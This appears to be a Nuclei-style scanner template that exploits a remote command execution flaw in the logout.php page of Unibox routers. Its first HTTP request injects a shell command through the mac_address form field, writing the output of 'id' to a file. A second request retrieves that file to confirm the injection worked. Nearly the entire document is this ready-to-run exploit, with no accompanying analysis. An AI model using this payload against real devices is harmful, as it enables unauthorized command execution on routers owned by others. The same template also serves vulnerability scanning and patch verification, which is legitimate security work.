id: poc-dl6fqaau6fk9o4ms
info:
  name: Unibox路由器 logout 存在远程命令执行漏洞
  author: hacktwo
  severity: critical
  description: ''
  tags: rce,2025
http:
- raw:
  - 'POST /authentication/logout.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 45


    logout_user=1&mac_address=;id>7.txt;


    命令执行：'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /authentication/7.txt HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
